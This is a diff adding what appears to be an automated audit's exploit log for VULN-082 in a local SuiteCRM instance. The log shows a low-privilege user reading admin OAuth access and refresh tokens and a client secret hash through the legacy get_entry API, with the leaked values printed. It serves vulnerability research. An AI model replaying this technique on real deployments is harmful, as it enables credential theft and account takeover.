@@ -1,0 +1,25 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-082/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-082/../.venv
+========================================================================
+VULN-082: legacy web service leaks OAuth token/secret material to any authenticated user
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web + legacy REST session
+[SETUP] create a real OAuth2Clients record (password grant)
+[OK] OAuth2Client id=44f11778-3f51-4f96-bbea-16f4a6d0879b name='Stage10-VULN-082-cli_80c004d3' secret(sha256)=771a62257fa398d39ada886ac06a24284af726292162c925dd917284608922ee
+[SETUP] mint a REAL V8 OAuth2 access_token+refresh_token for admin via password grant
+[OK] minted access_token(JWT)=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ... refresh_token(encrypted)=def50200f66cc1d6fca9afeac13fdc8061dd5f94...
+[INFO] JWT 'jti' claim (League's internal access-token identifier) = '5c44d555e138c322baf5446a12f5fc5aad561a3b826cd5cf53cac8fa3bdf1c7102066b7e16fead29'
+[INFO] (admin/db ground truth, orientation only) oauth2tokens row id=587e1eab-f82e-4086-9e08-1919046f1d45 access_token='5c44d555e138c322baf5446a12f5fc5aad561a3b826cd5cf53cac8fa3bdf1c7102066b7e16fead29' refresh_token='189edb6420e84b4c2b7039b692e1b03e25dd5d0e0f163501edc79e073eaef34fcfba8f3f89c0fbb8' assigned_user_id='1'
+[SETUP] create an ORDINARY low-privilege user -- no special ACL/Role needed for this finding
+[OK] low-priv user: mod_2752acc0 id=fdb9c739-4f3b-451e-9aa1-20c8b77b602b
+[STEP] low-priv get_entry_list(OAuth2Tokens) requesting access_token/refresh_token/state/assigned_user_id
+[INFO] get_entry_list(OAuth2Tokens) returned 0 row(s) -- OAuth2Tokens.get_list() row-scopes to the CALLER's own assigned_user_id (an application-level 'my tokens' filter, unrelated to ACL), so a listing call alone does not surface another user's row. Falling back to a direct by-id read (get_entry), the same primitive VULN-001 uses, which does NOT row-scope.
+[STEP] low-priv get_entry(OAuth2Tokens, id=587e1eab-f82e-4086-9e08-1919046f1d45) -- direct by-id BOLA read, no listing/row-scope involved, mirrors VULN-001's retrieve-by-id pattern
+[INFO] get_entry(OAuth2Tokens) response: {'entry_list': [{'id': '587e1eab-f82e-4086-9e08-1919046f1d45', 'module_name': 'OAuth2Tokens', 'name_value_list': {'id': {'name': 'id', 'value': '587e1eab-f82e-4086-9e08-1919046f1d45'}, 'access_token': {'name': 'access_token', 'value': '5c44d555e138c322baf5446a12f5fc5aad561a3b826cd5cf53cac8fa3bdf1c7102066b7e16fead29'}, 'refresh_token': {'name': 'refresh_token', 'value': '189edb6420e84b4c2b7039b692e1b03e25dd5d0e0f163501edc79e073eaef34fcfba8f3f89c0fbb8'}, 'assigned_user_id': {'name': 'assigned_user_id', 'value': '1'}, 'state': {'name': 'state', 'value': ''}, 'client': {'name': 'client', 'value': '44f11778-3f51-4f96-bbea-16f4a6d0879b'}}}], 'relationship_list': []}
+[PROOF] leaked row: access_token='5c44d555e138c322baf5446a12f5fc5aad561a3b826cd5cf53cac8fa3bdf1c7102066b7e16fead29' refresh_token='189edb6420e84b4c2b7039b692e1b03e25dd5d0e0f163501edc79e073eaef34fcfba8f3f89c0fbb8' assigned_user_id='1' client='44f11778-3f51-4f96-bbea-16f4a6d0879b'
+[STEP] low-priv get_entry_list(OAuth2Clients) requesting secret
+[INFO] low-priv get_entry_list(OAuth2Clients) returned 4 row(s); FOUND our client row
+[PROOF] leaked client row: secret='771a62257fa398d39ada886ac06a24284af726292162c925dd917284608922ee' (expected sha256 = '771a62257fa398d39ada886ac06a24284af726292162c925dd917284608922ee')
+[OK] Confirmed: a completely unrelated low-privilege user reads another user's (admin's) live OAuth2 access_token+refresh_token identifiers AND the OAuth2Client's secret hash, unredacted, via the legacy get_entry/get_entry_list API.
+==> VULN-082: CONFIRMED — low-priv user (no special ACL) read admin's OAuth2Tokens row: access_token=5c44d555e138c322baf5446a... refresh_token=189edb6420e84b4c2b7039b6... (exact match to DB-verified minted values); OAuth2Clients.secret=771a62257fa398d39ada886a... (exact match)
